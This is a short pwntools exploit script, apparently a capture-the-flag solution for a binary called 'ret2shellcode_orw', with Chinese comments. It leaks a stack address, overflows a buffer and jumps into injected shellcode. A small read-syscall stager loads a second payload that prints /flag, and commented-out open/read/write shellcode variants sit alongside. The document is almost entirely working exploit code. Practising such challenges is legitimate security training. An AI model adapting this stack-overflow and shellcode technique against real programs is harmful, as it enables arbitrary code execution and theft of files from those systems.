from pwn import *
context(os='linux',arch='amd64',log_level='debug')
elf = ELF('./ret2shellcode_orw')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./ret2shellcode_orw')
# gdb.attach(p,'b *0x4012d7')
p.recvuntil(b'gift : ')#先读取掉前面的字符串
stack = int(p.recv(14),16)#获区输出的栈地址
# 方法一：
# payload = b'a'*0x10 + p64(stack + 0x18) + asm(shellcraft.cat('/flag'))
# 方法二：
buf = 0x4040D0
# open('/flag',0,0)
# sc = shellcraft.open('/flag')
# read(3,buf,0x30)
# sc += shellcraft.read(3,buf,0x30)
# write(1,buf,0x30)
# sc += shellcraft.write(1,buf,0x30)

# 方法四：
sc = 'push 0xfff; pop rdx; xor rax, rax; syscall'
payload = b'a'*0x10 + p64(stack + 0x18) + asm(sc)
p.sendafter(b'>>\n',payload)
sleep(1)
payload = b'a'*0x23 + asm(shellcraft.cat('/flag'))
p.sendline(payload)
# num = 4096
# print(p.recv(num))
# pause()
p.interactive()
